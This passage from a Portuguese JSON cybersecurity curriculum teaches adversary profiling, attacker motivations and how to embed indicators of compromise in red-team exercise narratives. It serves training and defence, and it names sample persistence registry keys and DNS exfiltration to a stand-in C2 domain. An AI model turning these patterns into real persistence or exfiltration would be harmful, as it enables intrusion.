                                  "verification": "Perfil do adversário em 1 página com padrões, exemplos e gaps.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "Ferramenta de síntese (ex: Google Docs)",
                                    "Fontes cruzadas (CISA.gov, relatórios governamentais)"
                                  ],
                                  "tips": "Use storytelling para tornar o perfil acionável em cenários de threat hunting.",
                                  "learningObjective": "Transformar dados brutos em inteligência acionável sobre mindsets de adversários.",
                                  "commonMistakes": [
                                    "Generalizar demais sem evidências específicas",
                                    "Ignorar evolução temporal das TTPs"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar e Documentar Descobertas",
                                  "subSteps": [
                                    "Compare seu perfil com análises existentes (ex: blogs da CrowdStrike).",
                                    "Teste aplicando o perfil a um incidente recente não estudado.",
                                    "Documente em formato estruturado: tabela de TTPs, narrativa e referências.",
                                    "Compartilhe ou revise com pares para feedback."
                                  ],
                                  "verification": "Documento final validado com referências e auto-avaliação de precisão.",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "Ferramentas de colaboração (ex: GitHub, SharePoint)",
                                    "Checklists de validação"
                                  ],
                                  "tips": "Mantenha todas as referências hiperlinkadas para rastreabilidade.",
                                  "learningObjective": "Garantir rigor e reprodutibilidade na análise de adversários.",
                                  "commonMistakes": [
                                    "Não citar fontes, levando a plágio inadvertido",
                                    "Aceitar dados desatualizados sem verificação"
                                  ]
                                }
                              ],
                              "practicalExample": "Analise o Lazarus Group no ataque ao Sony Pictures (2014): Reconnaissance via OSINT em funcionários (T1591), Initial Access via spear-phishing com malware wiper (T1566.001). Identifique padrões como uso de infraestrutura norte-coreana e foque em detecção precoce.",
                              "finalVerifications": [
                                "Pode listar 5+ TTPs de reconnaissance e initial access para APT28 com exemplos reais.",
                                "Identifica 3 padrões comportamentais compartilhados entre APT28 e Lazarus.",
                                "Cria um perfil de adversário com motivações e vetores preferidos.",
                                "Sugere 3 mitigações baseadas em TTPs analisados.",
                                "Valida achados contra fontes independentes."
                              ],
                              "assessmentCriteria": [
                                "Precisão e citação correta de TTPs do MITRE ATT&CK (80%+ match).",
                                "Profundidade da análise de padrões (além de listagem superficial).",
                                "Relevância ao foco em reconnaissance e initial access.",
                                "Clareza e estruturação do perfil final.",
                                "Criatividade em conexões com incidentes reais."
                              ],
                              "crossCurricularConnections": [
                                "Geopolítica: Ligar TTPs a contextos como eleições russas ou sanções à Coreia do Norte.",
                                "Análise de Inteligência: Técnicas de OSINT e threat intelligence.",
                                "História Contemporânea: Estudo de ciberconflitos como guerra híbrida.",
                                "Estratégia Militar: Conceitos de OODA loop aplicados a atacantes cibernéticos."
                              ],
                              "realWorldApplication": "Em operações de Red Team, simule TTPs de APT28 para testes realistas; em Blue Team, configure detecções para padrões de reconnaissance como scanning passivo, melhorando defesa proativa contra ameaças persistentes em cenários de guerra cibernética."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.3.1.2",
                            "name": "Mapear Motivações e Objetivos",
                            "description": "Identificar motivações como espionagem econômica, sabotagem ou ransomware, e correlacioná-las com cenários de ataque para criar narrativas plausíveis baseadas em casos reais.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar Motivações Comuns de Ameaças Cibernéticas",
                                  "subSteps": [
                                    "Liste as principais categorias de motivações: espionagem econômica, sabotagem, ganho financeiro (ex: ransomware), ativismo hacktivista e guerra cibernética estatal.",
                                    "Defina cada motivação com base em frameworks como MITRE ATT&CK ou relatórios da Mandiant.",
                                    "Colete exemplos iniciais de cada uma de fontes públicas como relatórios da FireEye ou CISA.",
                                    "Classifique motivações por ator (estado-nação, criminoso, insider).",
                                    "Crie uma tabela simples com motivação, ator típico e impacto esperado."
                                  ],
                                  "verification": "Você pode listar pelo menos 5 motivações comuns com definições e um ator associado cada.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Acesso à internet",
                                    "MITRE ATT&CK Navigator",
                                    "Relatórios anuais de ameaças (ex: Verizon DBIR)"
                                  ],
                                  "tips": "Priorize fontes governamentais e de cibersegurança para precisão; evite wikis não verificadas.",
                                  "learningObjective": "Compreender e catalogar as motivações fundamentais por trás de ataques cibernéticos.",
                                  "commonMistakes": [
                                    "Confundir motivação com tática (ex: ransomware é método, não motivação)",
                                    "Ignorar atores emergentes como insiders motivados por vingança",
                                    "Listar apenas motivações financeiras, negligenciando geopolíticas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Casos Reais para Extrair Motivações",
                                  "subSteps": [
                                    "Selecione 3-5 casos reais documentados (ex: SolarWinds para espionagem, Colonial Pipeline para ransomware, NotPetya para sabotagem).",
                                    "Para cada caso, extraia evidências de motivação de relatórios forenses (quem, por quê, evidências).",
                                    "Mapeie a motivação principal e secundárias, notando correlações com objetivos maiores.",
                                    "Documente em um template: Caso | Ator | Motivação | Evidências | Resultado.",
                                    "Identifique padrões entre casos semelhantes."
                                  ],
                                  "verification": "Você possui um documento com 3 casos analisados, cada um com motivação mapeada e evidências citadas.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Relatórios de incidentes (CISA, Mandiant)",
                                    "Ferramentas de busca como Google Scholar ou Krebs on Security",
                                    "Planilha Google Sheets ou Excel"
                                  ],
                                  "tips": "Use buscas específicas como 'motivação SolarWinds APT29' para fontes primárias; anote citações para credibilidade.",
                                  "learningObjective": "Extrair lições de casos reais para mapear motivações autênticas de adversários.",
                                  "commonMistakes": [
                                    "Basear-se em notícias sensacionalistas sem relatórios técnicos",
                                    "Atribuir motivações sem evidências (ex: assumir tudo é financeiro)",
                                    "Não diferenciar entre atribuído e suspeito"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Correlacionar Motivações com Cenários de Ataque Hipotéticos",
                                  "subSteps": [
                                    "Crie uma matriz de correlação: linhas = motivações, colunas = cenários (ex: infraestrutura crítica, finanças, saúde).",
                                    "Para cada interseção, descreva como a motivação se manifesta no cenário (ex: ransomware em hospital para ganho rápido).",
                                    "Avalie plausibilidade com base em casos reais semelhantes.",
                                    "Adicione vetores de ataque prováveis por motivação (ex: phishing para espionagem).",
                                    "Priorize cenários de alto impacto para o seu contexto organizacional."
                                  ],
                                  "verification": "Você tem uma matriz completa com pelo menos 5 motivações x 4 cenários, com descrições plausíveis.",
                                  "estimatedTime": "1.5-2.5 horas",
                                  "materials": [
                                    "Planilha de correlação (Excel ou Draw.io)",
                                    "Lista de cenários de MITRE Engage",
                                    "Casos reais do Step 2"
                                  ],
                                  "tips": "Use cores na matriz para níveis de plausibilidade (verde=alta, vermelho=baixa); teste com 'e se?' para refinar.",
                                  "learningObjective": "Ligar motivações abstratas a cenários concretos para prever comportamentos adversários.",
                                  "commonMistakes": [
                                    "Fazer correlações genéricas sem base em casos reais",
                                    "Ignorar barreiras técnicas (ex: motivado mas sem capacidade)",
                                    "Sobrecarregar matriz com cenários irrelevantes"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Construir Narrativas Plausíveis de Adversário",
                                  "subSteps": [
                                    "Escolha um cenário e motivação da matriz; estruture narrativa: background do ator, planejamento, execução, exfiltração.",
                                    "Integre detalhes realistas de casos (TTPs, ferramentas, timing).",
                                    "Torne a narrativa em primeira pessoa ou storyboard para imersão.",
                                    "Revise por plausibilidade: 'Isso aconteceu antes? É detectável?'.",
                                    "Crie 2-3 variações para sensibilidades (ex: sucesso vs. falha)."
                                  ],
                                  "verification": "Você produziu pelo menos 2 narrativas completas, cada uma com 300+ palavras e referências a casos reais.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Ferramenta de escrita (Google Docs)",
                                    "Templates de narrativa de red teaming",
                                    "Imagens ou diagramas para storyboard"
                                  ],
                                  "tips": "Escreva como um relatório de inteligência; inclua quotes fictícias mas realistas do adversário para vivacidade.",
                                  "learningObjective": "Sintetizar mapeamentos em narrativas acionáveis para jogos de guerra cibernética.",
                                  "commonMistakes": [
                                    "Narrativas muito genéricas ou hollywoodianas",
                                    "Omitir ramificações (ex: detecção precoce)",
                                    "Não ancorar em evidências reais"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um cenário de hospital: Motivação = ganho financeiro via ransomware (baseado em casos como Universal Health Services). Narrativa: Grupo criminoso russo identifica vulnerabilidades em EHR systems via scan público, implanta Ryuk via phishing, criptografa dados críticos durante fim de semana, exige US$5M em BTC, ameaçando vazar dados de pacientes – plausível pois replicou ataques de 2020.",
                              "finalVerifications": [
                                "Liste 5+ motivações com exemplos reais sem hesitação.",
                                "Correlacione corretamente uma motivação a 3 cenários distintos.",
                                "Construa uma narrativa plausível para um cenário dado em <10 min.",
                                "Identifique falhas em narrativas alheias baseadas em casos reais.",
                                "Explique como uma motivação secundária afeta TTPs primários.",
                                "Crie matriz de correlação personalizada para uma indústria específica."
                              ],
                              "assessmentCriteria": [
                                "Precisão e fidelidade a casos reais (80%+ match com fontes).",
                                "Profundidade das correlações (múltiplas dimensões: ator, TTPs, impacto).",
                                "Criatividade equilibrada com plausibilidade nas narrativas.",
                                "Completude da matriz e documentação (todos campos preenchidos).",
                                "Capacidade de aplicação em contextos variados.",
                                "Clareza e estruturação (fácil de seguir para equipes)."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia: Teoria da motivação humana (Maslow, perfis criminais).",
                                "História/Geopolítica: Conflitos passados (ex: Stuxnet como sabotagem).",
                                "Jornalismo Investigativo: Análise de fontes e atribuição de atores.",
                                "Negócios/Economia: Impacto financeiro de motivações (custo de breaches).",
                                "Criminologia: Perfis de cibercriminosos vs. atores estatais."
                              ],
                              "realWorldApplication": "Em operações de cibersegurança e red teaming, use para criar cenários realistas em exercícios de tabletop ou CTF, melhorando detecção precoce e planejamento defensivo contra ameaças motivadas, como prever espionagem em supply chains corporativas."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.3.1.3",
                            "name": "Simular Pensamento Oponente",
                            "description": "Aplicar técnicas de 'thinking like the enemy' para prever decisões táticas do adversário, incorporando elementos psicológicos e adaptabilidade em narrativas de jogos de guerra cibernética.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Pesquisar e Perfilhar o Adversário",
                                  "subSteps": [
                                    "Colete dados de inteligência sobre grupos de ameaça conhecidos (ex: APTs específicas)",
                                    "Identifique motivações principais (financeiras, geopolíticas, ideológicas)",
                                    "Analise histórico de ataques: alvos preferidos, ferramentas usadas e TTPs (Tactics, Techniques, Procedures)",
                                    "Documente características demográficas e culturais do operador típico",
                                    "Crie um perfil psicológico básico: níveis de risco, paciência e criatividade"
                                  ],
                                  "verification": "Perfil documentado em formato estruturado (ex: tabela com 10+ atributos chave) revisado por pares",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Relatórios MITRE ATT&CK",
                                    "Bases de dados de threat intel (ex: AlienVault OTX)",
                                    "Ferramentas de OSINT como Maltego"
                                  ],
                                  "tips": "Priorize fontes primárias como IOCs reais de incidentes passados para maior realismo",
                                  "learningObjective": "Construir um perfil completo e realista do adversário para basear simulações futuras",
                                  "commonMistakes": [
                                    "Focar apenas em capacidades técnicas ignorando motivações humanas",
                                    "Usar dados desatualizados de ameaças",
                                    "Generalizar demais sem especificar variantes de grupos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear Capacidades Táticas e Recursos do Adversário",
                                  "subSteps": [
                                    "Liste armas cibernéticas prováveis (malware, exploits zero-day, C2 frameworks)",
                                    "Avalie recursos logísticos: acesso a infraestrutura (bots, proxies), suporte estatal",
                                    "Modele cadeia de comando: decisores estratégicos vs. operadores táticos",
                                    "Identifique fraquezas exploráveis no lado do adversário (ex: sanções limitando ferramentas)",
                                    "Crie um diagrama de capacidades com probabilidades de uso em cenários específicos"
                                  ],
                                  "verification": "Diagrama de capacidades aprovado, cobrindo pelo menos 80% das TTPs relevantes do MITRE",
                                  "estimatedTime": "1.5-2.5 horas",
                                  "materials": [
                                    "MITRE ATT&CK Navigator",
                                    "Ferramentas de modelagem como Draw.io ou Lucidchart",
                                    "Relatórios de ciberameaças recentes"
                                  ],
                                  "tips": "Use matrizes de probabilidade (alta/média/baixa) para quantificar riscos realistas",
                                  "learningObjective": "Entender o arsenal tático do adversário para prever opções viáveis em jogos de guerra",
                                  "commonMistakes": [
                                    "Superestimar capacidades sem evidências",
                                    "Ignorar limitações geográficas ou econômicas",
                                    "Confundir capacidades com intenções"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Simular Decisões Táticas Incorporando Psicologia",
                                  "subSteps": [
                                    "Adote perspectiva do adversário: 'O que eu faria no lugar deles?'",
                                    "Incorpore vieses cognitivos (ex: confirmação, ancoragem) e emoções (medo, ganância)",
                                    "Simule iterações de decisão: objetivos primários, planos B, respostas a contramedidas",
                                    "Role-play diálogos internos do adversário em narrativas escritas",
                                    "Ajuste para adaptabilidade: como o adversário pivotaria sob pressão"
                                  ],
                                  "verification": "Narrativa simulada de 500+ palavras com 3+ decisões táticas justificadas psicologicamente",
                                  "estimatedTime": "2-4 horas",
                                  "materials": [
                                    "Livros de psicologia aplicada (ex: 'Thinking, Fast and Slow')",
                                    "Ferramentas de simulação como Cyber Range ou tabletop exercises",
                                    "Templates de role-playing"
                                  ],
                                  "tips": "Grave sessões de role-play para autoanálise e detecção de vieses próprios",
                                  "learningObjective": "Prever ações adversárias integrando lógica tática com fatores humanos psicológicos",
                                  "commonMistakes": [
                                    "Projetar seu próprio mindset no adversário (mirror imaging)",
                                    "Negligenciar fadiga ou estresse em operadores",
                                    "Fazer simulações lineares sem ramificações"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar Simulação e Refinar Previsões Adaptativas",
                                  "subSteps": [
                                    "Teste a simulação em um mini-jogo de guerra cibernética contra um parceiro",
                                    "Colete feedback: acertos/erros nas previsões adversárias",
                                    "Analise desvios e ajuste o modelo (ex: adicionar loops de feedback adaptativo)",
                                    "Documente cenários alternativos baseados em adaptabilidade do adversário",
                                    "Integre lições em uma narrativa de ameaça final revisada"
                                  ],
                                  "verification": "Relatório de validação com taxa de acerto >70% em simulação testada",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Plataformas de simulação cibernética (ex: Cyberbit Range)",
                                    "Planilhas de tracking de previsões",
                                    "Parceiro para role-play adversário"
                                  ],
                                  "tips": "Use métricas quantitativas como 'tempo para detecção' para validar realismo",
                                  "learningObjective": "Refinar simulações para alta precisão em narrativas dinâmicas de jogos de guerra",
                                  "commonMistakes": [
                                    "Não testar em cenários reais",
                                    "Ignorar feedback externo",
                                    "Parar na primeira iteração sem refinamento"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernética simulando um APT russo (ex: Cozy Bear), perfilie motivações geopolíticas ligadas a eleições; preveja phishing spear em alvos de alto valor durante eventos noticiosos para maximizar pânico psicológico; simule pivot para living-off-the-land se detecção inicial ocorrer, adaptando a táticas de insider threats.",
                              "finalVerifications": [
                                "Pode gerar narrativas de ameaça com >80% de alinhamento a TTPs reais documentadas",
                                "Simulações preveem corretamente respostas adaptativas em 3+ cenários testados",
                                "Inclui elementos psicológicos em todas as decisões táticas simuladas",
                                "Perfil de adversário cobre motivações, capacidades e fraquezas de forma equilibrada",
                                "Validação em tabletop exercise mostra taxa de acerto >75%"
                              ],
                              "assessmentCriteria": [
                                "Precisão e realismo das previsões táticas (baseado em threat intel)",
                                "Integração profunda de fatores psicológicos e humanos",
                                "Nível de detalhe e acionabilidade nos sub-passos e narrativas",
                                "Capacidade de demonstrar adaptabilidade em simulações iterativas",
                                "Qualidade da documentação e verificações auto-impostas",
                                "Criatividade em conexões com cenários reais de ciberameaças"
                              ],
                              "crossCurricularConnections": [
                                "Psicologia Cognitiva: Vieses e tomada de decisão sob incerteza",
                                "Estratégia Militar: Doutrinas de Sun Tzu e teoria dos jogos",
                                "Inteligência Artificial: Modelagem de agentes adversários em simulações",
                                "Análise de Inteligência: Técnicas OSINT e profiling de atores estatais"
                              ],
                              "realWorldApplication": "Em operações de Red Team/Blue Team, essa habilidade permite prever e mitigar ataques reais, como na defesa de infraestruturas críticas contra APTs estatais, melhorando readiness em exercícios como Locked Shields da NATO."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.3.1.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.3.2",
                        "name": "Indicadores de Compromisso (IoCs)",
                        "description": "Incorporar Indicators of Compromise realistas, como hashes de malware, IPs suspeitos e padrões de tráfego, para tornar as narrativas de ameaça detectáveis e verossímeis em simulações de Red Team.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.3.2.1",
                            "name": "Identificar IoCs Comuns",
                            "description": "Catalogar IoCs típicos de campanhas reais, como domínios de phishing ou assinaturas YARA, extraídos de fontes como VirusTotal ou relatórios da Mandiant.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Conceitos Fundamentais de IoCs",
                                  "subSteps": [
                                    "Defina IoCs e liste os tipos principais: IPs, domínios, hashes (MD5/SHA), assinaturas YARA e URLs maliciosas.",
                                    "Estude exemplos de IoCs de campanhas conhecidas, como domínios de phishing em ataques de ransomware.",
                                    "Diferencie IoCs atômicos (ex: hash único) de compostos (ex: sequência de eventos).",
                                    "Revise categorias de IoCs baseadas em frameworks como MITRE ATT&CK.",
                                    "Crie um glossário pessoal com 10 termos relacionados a IoCs."
                                  ],
                                  "verification": "Glossário completo com definições precisas e exemplos para cada termo.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação MITRE ATT&CK (https://attack.mitre.org)",
                                    "Guia de IoCs da SANS Institute (PDF gratuito)"
                                  ],
                                  "tips": "Use diagramas para visualizar relações entre tipos de IoCs.",
                                  "learningObjective": "Compreender a taxonomia e importância dos IoCs em cenários de ameaça reais.",
                                  "commonMistakes": [
                                    "Confundir IoCs com TTPs (Tactics, Techniques, Procedures)",
                                    "Ignorar contexto temporal de validade dos IoCs"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Fontes Confiáveis de Inteligência de Ameaças",
                                  "subSteps": [
                                    "Cadastre-se em plataformas gratuitas como VirusTotal, AlienVault OTX e Hybrid Analysis.",
                                    "Navegue por relatórios públicos da Mandiant (M-Trends) e CrowdStrike (Global Threat Report).",
                                    "Busque campanhas recentes usando palavras-chave como 'phishing 2023' ou 'ransomware LockBit'.",
                                    "Colete amostras de IoCs de pelo menos 3 relatórios diferentes.",
                                    "Documente metadados de cada fonte: data, campanha associada e confiabilidade."
                                  ],
                                  "verification": "Lista de 5 fontes com links e 3 IoCs extraídos de cada uma.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "VirusTotal (https://virustotal.com)",
                                    "Mandiant Reports (https://www.mandiant.com/resources/reports)",
                                    "OTX (https://otx.alienvault.com)"
                                  ],
                                  "tips": "Use filtros avançados no VirusTotal para resultados relevantes; priorize fontes com IOCs recentes (<6 meses).",
                                  "learningObjective": "Identificar e acessar fontes primárias de IoCs de alta qualidade.",
                                  "commonMistakes": [
                                    "Confiar em fontes não verificadas",
                                    "Copiar IoCs sem contexto da campanha"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar e Extrair IoCs de Relatórios Reais",
                                  "subSteps": [
                                    "Selecione um relatório completo de uma campanha (ex: Mandiant sobre UNC2452).",
                                    "Identifique seções com IoCs (geralmente 'Indicators' ou 'Appendix').",
                                    "Extraia pelo menos 10 IoCs, categorizando por tipo e validando no VirusTotal.",
                                    "Crie regras YARA básicas para 2-3 amostras usando ferramentas online.",
                                    "Anote falsos positivos potenciais testando em ambientes controlados."
                                  ],
                                  "verification": "Relatório de análise com 10+ IoCs extraídos, categorizados e validados.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Relatório Mandiant exemplo (baixar PDF)",
                                    "YARA Editor online (https://yaradeps.com)",
                                    "VirusTotal para validação"
                                  ],
                                  "tips": "Procure por padrões como domínios DGA (Domain Generation Algorithms) em phishing.",
                                  "learningObjective": "Desenvolver habilidades de extração precisa de IoCs de fontes não estruturadas.",
                                  "commonMistakes": [
                                    "Extrair dados obsoletos",
                                    "Não validar IoCs em múltiplas fontes"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Catalogar e Organizar IoCs em um Repositório Pessoal",
                                  "subSteps": [
                                    "Crie uma planilha ou banco de dados simples (Google Sheets ou MISP gratuito).",
                                    "Estruture colunas: Tipo, Valor, Campanha, Fonte, Data, Status (ativo/inativo).",
                                    "Popule com 20+ IoCs coletados, incluindo assinaturas YARA.",
                                    "Teste a catalogação alimentando IoCs em uma SIEM de teste (ex: Splunk Free).",
                                    "Revise e atualize IoCs com base em feedback de validação."
                                  ],
                                  "verification": "Repositório funcional com 20 IoCs, query testada e relatório de uso.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Google Sheets template para IoCs",
                                    "MISP Community Edition (https://www.misp-project.org)",
                                    "Splunk Free Trial"
                                  ],
                                  "tips": "Use tags para facilitar buscas; automatize importações com scripts CSV.",
                                  "learningObjective": "Construir um catálogo acionável de IoCs para uso em operações de defesa.",
                                  "commonMistakes": [
                                    "Falta de padronização nos campos",
                                    "Não incluir data de expiração"
                                  ]
                                }
                              ],
                              "practicalExample": "Analise o relatório Mandiant sobre a campanha SolarWinds (UNC2452): extraia domínios como 'avsvmcloud.com', hashes SHA256 de malware e crie uma regra YARA para o payload Cobalt Strike. Valide no VirusTotal e catalogue em uma planilha com contexto da campanha.",
                              "finalVerifications": [
                                "Catálogo pessoal com pelo menos 20 IoCs únicos de 3+ campanhas reais.",
                                "Validação de 80% dos IoCs em VirusTotal com detecções positivas.",
                                "Regra YARA funcional testada em amostra conhecida.",
                                "Relatório de análise com categorização precisa por tipo.",
                                "Demonstração de uso em ferramenta de detecção (ex: SIEM alert).",
                                "Atualização de pelo menos 5 IoCs com status de validade."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação e categorização de IoCs (90%+ correto).",
                                "Diversidade de fontes e tipos de IoCs utilizados.",
                                "Qualidade da documentação: contexto, metadados e validação incluídos.",
                                "Capacidade de criar regras acionáveis como YARA.",
                                "Eficiência no tempo: conclusão dentro do estimado total (8 horas).",
                                "Criatividade em conexões com cenários reais de ameaça."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Uso de planilhas e queries para organização de IoCs.",
                                "Pesquisa e Inteligência: Técnicas de OSINT para fontes de ameaças.",
                                "Programação: Criação de regras YARA e scripts de automação.",
                                "Gestão de Projetos: Manutenção de repositórios dinâmicos de inteligência.",
                                "Ética em TI: Avaliação de privacidade ao lidar com IoCs reais."
                              ],
                              "realWorldApplication": "Em um SOC (Security Operations Center), use o catálogo para configurar regras de detecção em firewalls/EDR, acelerando resposta a incidentes como phishing ou ransomware, reduzindo MTTD (Mean Time to Detect) em até 50%."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.3.2.2",
                            "name": "Integrar IoCs em Cenários",
                            "description": "Inserir IoCs de forma contextual em narrativas, garantindo que eles reflitam táticas reais de persistência e exfiltração de dados, alinhados com frameworks como Cyber Kill Chain.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar e Coletar IoCs Relevantes",
                                  "subSteps": [
                                    "Pesquise fontes confiáveis como MITRE ATT&CK, AlienVault OTX ou relatórios de threat intelligence para IoCs relacionados a persistência (ex: registry keys maliciosos) e exfiltração (ex: domínios C2).",
                                    "Selecione 5-10 IoCs que se alinhem com táticas reais, priorizando hashes, IPs, URLs e padrões de tráfego.",
                                    "Documente metadados de cada IoC: origem, data de descoberta, táticas associadas (TA0003 para Persistence, TA0010 para Exfiltration).",
                                    "Classifique IoCs por tipo (network, host, file) e relevância ao cenário.",
                                    "Valide a atualidade dos IoCs verificando se ainda são ativos via ferramentas como VirusTotal."
                                  ],
                                  "verification": "Lista documentada de IoCs com metadados completos e validação em pelo menos uma ferramenta externa.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Acesso a MITRE ATT&CK Navigator",
                                    "VirusTotal ou Hybrid Analysis",
                                    "Planilha ou ferramenta de notas (ex: Notion, Excel)"
                                  ],
                                  "tips": "Foquem em IoCs de campaigns reais como SolarWinds ou Conti para maior realismo.",
                                  "learningObjective": "Compreender fontes e tipos de IoCs alinhados a táticas de adversários reais.",
                                  "commonMistakes": [
                                    "Usar IoCs obsoletos ou fictícios",
                                    "Ignorar contexto tático",
                                    "Sobrecarregar com IoCs irrelevantes"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear IoCs ao Cyber Kill Chain",
                                  "subSteps": [
                                    "Revise o Cyber Kill Chain (Reconnaissance a Actions on Objectives) e identifique fases para persistência (Installation, C2) e exfiltração (Actions on Objectives).",
                                    "Atribua cada IoC a uma ou mais fases, criando um mapa visual (ex: tabela ou diagrama).",
                                    "Correlacione com MITRE ATT&CK para enriquecer (ex: T1547 para boot/logon persistence).",
                                    "Priorize IoCs por impacto: um para detecção inicial, outro para persistência longa.",
                                    "Ajuste o mapeamento para caber no fluxo narrativo do cenário."
                                  ],
                                  "verification": "Mapa visual ou tabela com IoCs mapeados a fases do Kill Chain, com justificativas.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Cyber Kill Chain diagram (PDF ou imagem)",
                                    "MITRE ATT&CK Navigator",
                                    "Ferramenta de diagramação (Draw.io, Lucidchart)"
                                  ],
                                  "tips": "Use cores para diferenciar fases e tipos de IoC para visualização rápida.",
                                  "learningObjective": "Mapear IoCs a frameworks de ataque para garantir alinhamento tático.",
                                  "commonMistakes": [
                                    "Mapeamento genérico sem justificativa",
                                    "Ignorar sobreposições de fases",
                                    "Não priorizar por detectabilidade"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Inserir IoCs na Narrativa do Cenário",
                                  "subSteps": [
                                    "Esboce a narrativa base do cenário (ex: ataque a uma empresa de energia).",
                                    "Insira IoCs organicamente: descreva ações do atacante gerando o IoC (ex: 'O malware persiste via Run key HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\evilapp').",
                                    "Garanta contexto: explique como o IoC reflete tática real sem quebrar imersão.",
                                    "Distribua IoCs ao longo da narrativa para simular progressão (inicial, meio, fim).",
                                    "Escreva draft completo com 500-1000 palavras, destacando IoCs."
                                  ],
                                  "verification": "Narrativa draft com IoCs integrados e destacados, fluida e realista.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Editor de texto (Google Docs, Markdown)",
                                    "Exemplos de narrativas de CTFs ou relatórios de IR"
                                  ],
                                  "tips": "Use linguagem do atacante para IoCs (ex: logs simulados) para maior imersão.",
                                  "learningObjective": "Criar narrativas onde IoCs emergem naturalmente de ações táticas.",
                                  "commonMistakes": [
                                    "Listar IoCs como bullet points",
                                    "Inserir sem contexto narrativo",
                                    "Expor IoCs cedo demais"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar e Refinar a Integração",
                                  "subSteps": [
                                    "Simule detecção: como um SOC identificaria cada IoC na narrativa?",
                                    "Teste realismo com pares ou auto-revisão: IoCs plausíveis para o TTP?",
                                    "Ajuste para balancear stealth (persistência sutil) e detectabilidade (exfiltração óbvia).",
                                    "Meça cobertura: pelo menos 70% das fases do Kill Chain com IoCs.",
                                    "Finalize versão polida com anexos (mapa, fontes IoCs)."
                                  ],
                                  "verification": "Versão final validada com feedback ou auto-checklist, cobrindo todas fases chave.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Checklist de validação",
                                    "Ferramentas de simulação (ex: Atomic Red Team para testar IoCs locais)"
                                  ],
                                  "tips": "Peça review de um colega para bias detection.",
                                  "learningObjective": "Garantir que IoCs elevem o realismo e utilidade do cenário para treinamento.",
                                  "commonMistakes": [
                                    "Pular validação de plausibilidade",
                                    "Ignorar viés de confirmação",
                                    "Não balancear stealth vs. detecção"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um cenário de ataque ransomware a uma rede corporativa: Na fase de Installation, integre o IoC 'Registry key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ransom_helper' para persistência. Na Exfiltration, adicione 'Tráfego DNS para evilc2[.]com a cada 5min, volume 10MB/dia' refletindo TA0010, permitindo que defensores pratiquem hunting via Zeek logs.",
                              "finalVerifications": [
                                "Todos IoCs mapeados a pelo menos uma fase do Cyber Kill Chain com justificativa.",
                                "Narrativa flui naturalmente sem 'quebra' por IoCs artificiais.",
                                "IoCs validados em fontes externas e plausíveis para TTPs reais.",
                                "Cobertura de persistência e exfiltração com 3+ IoCs cada.",
                                "Checklist de realismo assinado (auto ou peer review).",
                                "Anexos incluem mapa, fontes e simulação de detecção."
                              ],
                              "assessmentCriteria": [
                                "Precisão tática: IoCs alinhados 100% a frameworks como Kill Chain/MITRE.",
                                "Integração contextual: IoCs emergem organicamente (nota 1-10).",
                                "Realismo e atualidade: IoCs de campaigns recentes/ativas.",
                                "Balanceamento: Stealth para persistência, detectável para exfil.",
                                "Completude: Todos campos da expansão preenchidos.",
                                "Criatividade: Narrativa envolvente para treinamento."
                              ],
                              "crossCurricularConnections": [
                                "Storytelling e Narrativa (Comunicação: criar cenários imersivos).",
                                "Análise de Dados (Estatística: correlacionar IoCs em logs).",
